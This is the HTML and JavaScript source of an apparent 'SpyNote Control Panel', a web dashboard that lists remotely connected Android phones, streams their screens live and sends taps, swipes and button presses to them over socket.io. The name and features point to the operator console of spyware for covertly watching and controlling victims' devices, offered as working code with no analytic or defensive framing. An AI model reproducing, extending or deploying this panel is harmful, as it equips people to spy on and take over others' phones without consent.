<!DOCTYPE html>
<html>
<head>
    <title>üì± SpyNote Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
            background: linear-gradient(135deg, #0f0f23, #1a1a2e, #16213e); 
            color: white; height: 100vh; overflow: hidden; user-select: none;
        }
        #devices {
            position: fixed; top: 15px; left: 15px; z-index: 100;
            background: rgba(0,0,0,0.95); padding: 20px; 
            max-height: 85vh; overflow-y: auto; min-width: 280px; max-width: 320px;
            border-radius: 20px; backdrop-filter: blur(20px); border: 1px solid #333;
            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
        }
        .device { 
            padding: 18px; margin: 12px 0; background: rgba(50,50,70,0.8); 
            cursor: pointer; border-radius: 15px; transition: all 0.3s ease;
            border: 2px solid transparent; position: relative; overflow: hidden;
        }
        .device::before {
            content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.5s;
        }
        .device:hover::before { left: 100%; }
        .device:hover { 
            background: rgba(70,70,100,0.9); transform: translateX(8px); border-color: #00ff88;
            box-shadow: 0 10px 30px rgba(0,255,136,0.3);
        }
        .active { 
            background: linear-gradient(135deg, #00ff88, #00cc6a) !important; 
            color: #000; border-color: #00ff88 !important; box-shadow: 0 0 30px #00ff88;
        }
        .disconnected { opacity: 0.5; }
        .device-info { font-size: 14px; }
        .device-status { font-size: 12px; font-weight: bold; margin-top: 4px; }

        #phone-container {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            z-index: 50; transition: all 0.3s ease;
        }
        #phone-frame {
            width: clamp(320px, 85vw, 420px); 
            height: clamp(640px, 170vw, 840px);
            background: #111; border: 30px solid #222; 
            border-radius: 60px; position: relative; cursor: pointer; 
            touch-action: none; box-shadow: 0 30px 60px rgba(0,0,0,0.8);
            transition: all 0.3s ease;
        }
        #screen { 
            width: 100%; height: 100%; background: #000; 
            border-radius: 40px; position: relative; overflow: hidden;
            image-rendering: pixelated; image-rendering: -moz-crisp-edges;
            image-rendering: crisp-edges;
        }
        #status { 
            position: fixed; top: 15px; right: 15px; z-index: 100;
            background: rgba(0,0,0,0.95); padding: 20px; border-radius: 15px;
            backdrop-filter: blur(20px); border: 1px solid #333; min-width: 200px;
        }
        #fps-counter { font-size: 14px; margin: 8px 0; color: #00ff88; }
        #controls { 
            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
            display: flex; gap: 15px; z-index: 100;
        }
        button {
            padding: 16px 24px; background: linear-gradient(45deg, #667eea, #764ba2);
            color: white; border: none; border-radius: 30px; cursor: pointer;
            font-size: 16px; font-weight: 600; transition: all 0.3s;
            box-shadow: 0 8px 25px rgba(102,126,234,0.4); min-width: 80px;
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(102,126,234,0.6); }
        button:active { transform: translateY(0); }
        
        /* Mobile Optimizations */
        @media (max-width: 768px) {
            #devices { 
                position: fixed; top: 0; left: 0; width: 100%; height: 100vh;
                max-height: none; max-width: none; border-radius: 0;
                backdrop-filter: blur(10px);
            }
            #phone-container, #status, #controls { display: none; }
            #screen { border-radius: 0; }
        }
        
        /* Fullscreen */
        :fullscreen #devices { display: none; }
        :fullscreen #phone-frame { 
            width: 100vw; height: 100vh; border: none; border-radius: 0;
            margin: 0; max-width: none; max-height: none;
        }
    </style>
</head>
<body>
    <div id="devices">
        <h3 style="margin-bottom: 20px; color: #00ff88;">üì± Connected Devices</h3>
        <div id="device-list">Loading devices...</div>
    </div>
    
    <div id="status">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div id="fps-counter">FPS: <span id="fps">0</span> | Device: <span id="selectedDevice">-</span></div>
        <div id="latency">Latency: -- ms</div>
    </div>

    <div id="phone-container">
        <div id="phone-frame">
            <canvas id="screen"></canvas>
        </div>
    </div>

    <div id="controls">
        <button onclick="sendHome()">üè† Home</button>
        <button onclick="sendBack()">üîô Back</button>
        <button onclick="sendRecent()">üìã Recent</button>
        <button onclick="toggleFullScreen()">üì± Full</button>
    </div>

    <script>
        const socket = io({ transports: ['websocket'] });
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 1920;
        let lastFrameTime = 0, frameCount = 0, totalLatency = 0, latencyCount = 0;
        let isDragging = false, startX = 0, startY = 0;
        let lastTouchTime = 0;

        const canvas = document.getElementById('screen');
        const ctx = canvas.getContext('2d', { alpha: false });
        const phoneFrame = document.getElementById('phone-frame');
        const deviceList = document.getElementById('device-list');
        const connectionStatus = document.getElementById('connectionStatus');
        const selectedDevice = document.getElementById('selectedDevice');
        const fpsDisplay = document.getElementById('fps');
        const latencyDisplay = document.getElementById('latency');

        // Ultra-smooth canvas setup
        ctx.imageSmoothingEnabled = false;
        ctx.mozImageSmoothingEnabled = false;
        ctx.webkitImageSmoothingEnabled = false;
        ctx.msImageSmoothingEnabled = false;

        // Socket events
        socket.on('connect', () => {
            connectionStatus.textContent = '‚úÖ Connected';
            connectionStatus.style.color = '#00ff88';
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        socket.on('screen-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            const startTime = performance.now();
            const img = new Image();
            
            img.onload = () => {
                const rect = phoneFrame.getBoundingClientRect();
                canvas.width = rect.width;
                canvas.height = rect.height;
                
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                
                // FPS & Latency
                frameCount++;
                const now = performance.now();
                const latency = now - startTime;
                totalLatency += latency;
                latencyCount++;
                
                if (now - lastFrameTime >= 1000) {
                    const fps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                    const avgLatency = Math.round(totalLatency / latencyCount);
                    fpsDisplay.textContent = fps;
                    latencyDisplay.textContent = `Latency: ${avgLatency} ms`;
                    frameCount = 0;
                    totalLatency = 0;
                    latencyCount = 0;
                    lastFrameTime = now;
                }
            };
            
            img.src = 'data:image/jpeg;base64,' + data.data;
        });

        function updateDeviceList(devices) {
            deviceList.innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)">
                        <div class="device-info">
                            <b>${info.model?.slice(0,20) || id.slice(0,8)}</b>
                        </div>
                        <div class="device-status">
                            ${info.brand || 'Android'} ${info.version || '?'}
                            ${info.connected ? 'üü¢ LIVE' : 'üî¥ OFFLINE'}
                        </div>
                    </div>
                `).join('') : '<div style="text-align:center;opacity:0.5;">No devices online</div>';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            selectedDevice.textContent = deviceId.slice(0,8);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            socket.emit('control', { deviceId });
        }

        // PERFECT Touch/Mouse Controls
        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.floor((clientX - rect.left) * scaleX),
                y: Math.floor((clientY - rect.top) * scaleY)
            };
        }

        // Touch events (Mobile-first)
        phoneFrame.addEventListener('touchstart', handleStart, { passive: false });
        phoneFrame.addEventListener('touchmove', handleMove, { passive: false });
        phoneFrame.addEventListener('touchend', handleEnd, { passive: false });

        // Mouse events (Desktop)
        phoneFrame.addEventListener('mousedown', handleStart);
        phoneFrame.addEventListener('mousemove', handleMove);
        phoneFrame.addEventListener('mouseup', handleEnd);
        phoneFrame.addEventListener('mouseleave', handleEnd);

        function handleStart(e) {
            e.preventDefault();
            isDragging = true;
            const coords = getScaledCoords(
                e.touches?.[0]?.clientX || e.clientX,
                e.touches?.[0]?.clientY || e.clientY
            );
            startX = coords.x; startY = coords.y;
            lastTouchTime = Date.now();
            sendTap(coords.x, coords.y);
        }

        function handleMove(e) {
            if (!isDragging || !currentDevice) return;
            e.preventDefault();
            const coords = getScaledCoords(
                e.touches?.[0]?.clientX || e.clientX,
                e.touches?.[0]?.clientY || e.clientY
            );
            
            // Send swipe only if moved significantly
            const distance = Math.hypot(coords.x - startX, coords.y - startY);
            if (distance > 10) {
                sendSwipe(startX, startY, coords.x, coords.y);
            }
        }

        function handleEnd(e) {
            if (Date.now() - lastTouchTime < 150) {
                // Double-tap detection for long press
                sendLongPress(startX, startY);
            }
            isDragging = false;
        }

        function sendTap(x, y) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'tap', 
                x: Math.floor(x), 
                y: Math.floor(y) 
            });
        }

        function sendSwipe(sx, sy, ex, ey) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'swipe', 
                startX: Math.floor(sx), startY: Math.floor(sy),
                endX: Math.floor(ex), endY: Math.floor(ey)
            });
        }

        function sendLongPress(x, y) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'longpress', 
                x: Math.floor(x), 
                y: Math.floor(y) 
            });
        }

        function sendBack() {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'back' });
        }

        function sendHome() {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'home' });
        }

        function sendRecent() {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'recent' });
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen().catch(() => {});
            } else {
                document.exitFullscreen();
            }
        }

        // Load initial devices
        fetch('/devices').then(r => r.json()).then(updateDeviceList);
    </script>
</body>
</html>
